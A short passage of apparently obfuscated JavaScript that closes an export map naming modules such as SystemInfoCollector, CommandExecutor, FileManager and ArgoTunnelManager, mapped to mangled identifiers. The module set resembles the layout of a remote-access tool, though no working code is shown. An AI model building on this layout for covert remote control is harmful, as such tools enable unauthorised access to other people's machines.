    'SystemInfoCollector': a0S,
    'CommandExecutor': a0T,
    'FileManager': a0V,
    'TaskManager': a0W,
    'ArgoTunnelManager': a0aD,
    'KModeController': a0aE
};